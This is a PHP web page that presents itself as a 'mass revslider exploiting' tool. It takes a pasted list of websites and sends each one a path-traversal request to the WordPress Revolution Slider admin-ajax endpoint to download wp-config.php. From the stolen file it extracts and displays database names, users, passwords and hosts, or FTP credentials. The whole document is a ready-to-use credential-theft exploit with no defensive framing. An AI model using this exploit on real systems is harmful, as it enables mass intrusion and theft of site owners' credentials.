<body bgcolor="#000000" text="white">
<center>
<img src='http://im48.gulfup.com/FMwpOF.png' height="150" width="150"></img><br>
<font face='courier' color=red size='+1'>
mass revslider exploiting<br>by ThePrince MaGnoM<br>http://codersleet.com/</font><br>
<form method='post'>
<textarea name='sites' cols='50' rows='12'></textarea><br>
<input type='submit' name='go' value='get'>
</form>
<?php 

function findit($mytext,$starttag,$endtag) {
 $posLeft  = stripos($mytext,$starttag)+strlen($starttag);
 $posRight = stripos($mytext,$endtag,$posLeft+1);
 return  substr($mytext,$posLeft,$posRight-$posLeft);
}
error_reporting(0);
set_time_limit(0);
$ya=$_POST['go'];
$co=$_POST['sites'];

if($ya){
 $e=explode("\r\n",$co);
 foreach($e as $bda){
	//echo '<br>'.$bda;
	$linkof='/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
	$dn=($bda).($linkof);
	$file=@file_get_contents($dn);
	if(eregi('DB_HOST',$file) and !eregi('FTP_USER',$file) ){
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
	echo "<center><font face='courier' color='#00BFFF' >".$bda."</font></center>";
	echo "<font face='courier' color=lime >DB name : </font>".findit($file,"DB_NAME', '","');")."<br>";
	echo "<font face='courier' color=lime >DB user : </font>".findit($file,"DB_USER', '","');")."<br>";
	echo "<font face='courier' color=lime >DB pass : </font>".findit($file,"DB_PASSWORD', '","');")."<br>";
	echo "<font face='courier' color=lime >DB host : </font>".findit($file,"DB_HOST', '","');")."<br>";
	}
	elseif(eregi('DB_HOST',$file) and eregi('FTP_USER',$file)){
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
	echo "<center><font face='courier' color='#00BFFF' >".$bda."</font></center>";
	echo "<font face='courier' color=lime >FTP user : </font>".findit($file,"FTP_USER','","');")."<br>";
	echo "<font face='courier' color=lime >FTP pass : </font>".findit($file,"FTP_PASS','","');")."<br>";
	echo "<font face='courier' color=lime >FTP host : </font>".findit($file,"FTP_HOST','","');")."<br>";
	}
	else{echo "<center><font face='courier' color='yellow' >".$bda." ----> not infected </font></center>";}
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
 }
 
}

?>